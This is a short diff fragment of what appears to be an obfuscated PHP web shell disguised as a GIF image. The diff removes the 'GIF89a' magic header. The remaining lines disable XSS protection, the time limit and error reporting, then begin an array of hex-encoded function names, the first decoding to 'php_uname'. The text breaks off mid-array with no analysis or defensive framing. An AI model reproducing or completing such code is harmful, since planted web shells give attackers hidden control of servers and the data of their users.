@@ -1,4 +1,3 @@
-GIF89a
 <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
 $Array = [
 		'7068705f756e616d65',
